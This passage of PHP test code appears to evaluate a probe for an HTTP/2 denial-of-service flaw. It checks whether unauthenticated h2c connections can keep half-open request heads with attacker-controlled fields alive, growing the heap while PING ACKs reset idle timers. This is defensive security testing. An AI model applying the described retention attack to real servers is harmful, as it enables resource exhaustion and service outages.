      $usedRefreshed = 0;
      $writesAdvanced = 0;
      $ports = array_flip($probe['attack_ports']);
      foreach (($persistent['h2'] ?? []) as $connection) {
         $port = $connection['port'] ?? 0;
         if (! is_int($port) || ! isSet($ports[$port])) {
            continue;
         }
         foreach (($baseline['h2'] ?? []) as $base) {
            if (($base['port'] ?? 0) !== $port) {
               continue;
            }
            if (($connection['used'] ?? 0) > ($base['used'] ?? 0)) {
               $usedRefreshed++;
            }
            if (($connection['writes'] ?? 0) > ($base['writes'] ?? 0)) {
               $writesAdvanced++;
            }
            break;
         }
      }

      $exactRetained =
         ($probe['preface_acks'] ?? 0) === $connectionCount
         && ($probe['attack_frames_written'] ?? 0) === $targetStreams
         && ($probe['attack_bytes_written'] ?? 0) === $expectedAttackBytes
         && ($probe['attack_short_writes'] ?? -1) === 0
         && ($probe['first_ping_acks'] ?? 0) === $connectionCount
         && count($probe['first_ping_ports'] ?? []) === $connectionCount
         && ($probe['sustain_ping_acks'] ?? 0) === 4 * $connectionCount
         && ($probe['sustain_elapsed_ms'] ?? 0.0) >= 16_000.0
         && ($probe['attack_resets'] ?? null) === []
         && ($probe['attack_goaways'] ?? null) === []
         && ($baseline['pid'] ?? 0) === $PID
         && ($baseline['tagged_streams'] ?? -1) === 0
         && ($retained['pid'] ?? 0) === $PID
         && ($retained['cap'] ?? -1) === $workerCap
         && ($retained['tagged_connections'] ?? -1) === $connectionCount
         && ($retained['tagged_streams'] ?? -1) === $targetStreams
         && ($retained['controlled_fields'] ?? -1) === $targetFields
         && ($retained['decoded_list_bytes'] ?? -1) === $expectedListBytes
         && ($retained['body_bytes'] ?? -1) === 0
         && ($retained['body_ledger'] ?? -1) === 0
         && ($retained['decoder_ledger'] ?? -1) === 0
         && ($retained['stream_ledger'] ?? -1) === 0
         && ($retained['head_ledger'] ?? -1) === 0
         && ($retained['pending'] ?? -1) === 0
         && $heapGrowth >= $heapFloor
         && ($persistent['pid'] ?? 0) === $PID
         && ($persistent['tagged_connections'] ?? -1) === $connectionCount
         && ($persistent['tagged_streams'] ?? -1) === $targetStreams
         && ($persistent['controlled_fields'] ?? -1) === $targetFields
         && ($persistent['decoded_list_bytes'] ?? -1) === $expectedListBytes
         && ($persistent['body_ledger'] ?? -1) === 0
         && ($persistent['head_ledger'] ?? -1) === 0
         && ($persistent['pending'] ?? -1) === 0
         && $persistentHeapGrowth >= $heapFloor
         && $usedRefreshed === $connectionCount
         && $writesAdvanced === $connectionCount;

      if ($exactRetained) {
         Vars::$labels = ['H3 confirmed source-to-sink evidence'];
         dump(json_encode([
            ...$probe,
            'heap_growth' => $heapGrowth,
            'persistent_heap_growth' => $persistentHeapGrowth,
            'expected_list_bytes' => $expectedListBytes,
            'used_refreshed' => $usedRefreshed,
            'writes_advanced' => $writesAdvanced,
         ], JSON_UNESCAPED_SLASHES));

         return 'CONFIRMED H3: four unauthenticated h2c connections retained '
            . "{$targetStreams} half-open request heads containing {$targetFields} "
            . "attacker-controlled field entries and {$expectedListBytes} decoded "
            . "list bytes. Live PHP heap grew by {$heapGrowth} bytes while the "
            . 'worker, decoder-carry, stream-output, and body ledgers all remained '
            . 'zero. Unique PING ACKs advanced every connection idle clock over '
            . (int) $probe['sustain_elapsed_ms'] . ' ms, the same state persisted '
            . 'past the natural timeout, and same-worker cleanup released it exactly.';
      }

      $pressure = 0;
      $pressureGoaways = 0;
      foreach ($probe['attack_resets'] as $error => $count) {
         if (
            (int) $error === Errors::EnhanceYourCalm->value
            || (int) $error === Errors::RefusedStream->value
         ) {
            $pressure += $count;
         }
      }
      foreach ($probe['attack_goaways'] as $error => $count) {
         if (
            (int) $error === Errors::EnhanceYourCalm->value
            || (int) $error === Errors::RefusedStream->value
         ) {
            $pressure += $count;
            $pressureGoaways += $count;
         }
      }
      $bounded = ($retained['decoded_list_bytes'] ?? PHP_INT_MAX) <= $workerCap
         && ($persistent['decoded_list_bytes'] ?? PHP_INT_MAX) <= $workerCap
         && ($retained['pending'] ?? PHP_INT_MAX) <= $workerCap
         && ($persistent['pending'] ?? PHP_INT_MAX) <= $workerCap;
      $accounted =
         (
            ($retained['tagged_streams'] ?? -1) === 0
            || (
               ($retained['pending'] ?? -1) > 0
               && ($retained['pending'] ?? -1)
                  >= ($retained['decoded_list_bytes'] ?? PHP_INT_MAX)
            )
         )
         && (
            ($persistent['tagged_streams'] ?? -1) === 0
            || (
               ($persistent['pending'] ?? -1) > 0
               && ($persistent['pending'] ?? -1)
                  >= ($persistent['decoded_list_bytes'] ?? PHP_INT_MAX)
            )
         );
      $completeSource =
         ($probe['attack_frames_written'] ?? 0) === $targetStreams
         && ($probe['attack_bytes_written'] ?? 0) === $expectedAttackBytes
         && ($probe['attack_short_writes'] ?? -1) === 0;
      $closedSource =
         ($probe['attack_frames_written'] ?? 0) > 0
         && ($probe['attack_short_writes'] ?? 0) > 0
         && $pressureGoaways >= ($probe['attack_short_writes'] ?? PHP_INT_MAX);
      $sourceExercised =
         ($probe['preface_acks'] ?? 0) === $connectionCount
         && ($probe['register']['pid'] ?? 0) === $PID
         && ($baseline['pid'] ?? 0) === $PID
         && ($retained['pid'] ?? 0) === $PID
         && ($persistent['pid'] ?? 0) === $PID
         && count($barrierPorts) === $connectionCount
         && ($completeSource || $closedSource);
      if ($pressure > 0 && $bounded && $accounted && $sourceExercised) {
         return true;
      }

      Vars::$labels = ['H3 accounting decision evidence'];
      dump(json_encode([
         ...$probe,
         'heap_growth' => $heapGrowth,
         'persistent_heap_growth' => $persistentHeapGrowth,
         'expected_list_bytes' => $expectedListBytes,
         'pressure' => $pressure,
         'pressure_goaways' => $pressureGoaways,
         'bounded' => $bounded,
         'accounted' => $accounted,
         'source_exercised' => $sourceExercised,
      ], JSON_UNESCAPED_SLASHES));

      return 'H3 control failed: the exact vulnerable retention state was not '
         . 'observed, but the server also emitted no explicit head-pressure '
         . 'RST_STREAM/GOAWAY while keeping tagged decoded state within the '
         . 'configured worker bound. '
         . (string) json_encode([
            'preface_acks' => $probe['preface_acks'],
            'attack_frames_written' => $probe['attack_frames_written'],
            'attack_bytes_written' => $probe['attack_bytes_written'],
            'attack_short_writes' => $probe['attack_short_writes'],
            'first_ping_acks' => $probe['first_ping_acks'],
            'sustain_ping_acks' => $probe['sustain_ping_acks'],
            'attack_resets' => $probe['attack_resets'],
            'attack_goaways' => $probe['attack_goaways'],
            'baseline' => $baseline,
            'retained' => $retained,
            'persistent' => $persistent,
            'heap_growth' => $heapGrowth,
            'persistent_heap_growth' => $persistentHeapGrowth,
            'expected_list_bytes' => $expectedListBytes,
            'used_refreshed' => $usedRefreshed,
            'writes_advanced' => $writesAdvanced,
            'pressure' => $pressure,
            'pressure_goaways' => $pressureGoaways,
            'bounded' => $bounded,
            'accounted' => $accounted,
            'source_exercised' => $sourceExercised,
         ], JSON_UNESCAPED_SLASHES);
   },
);
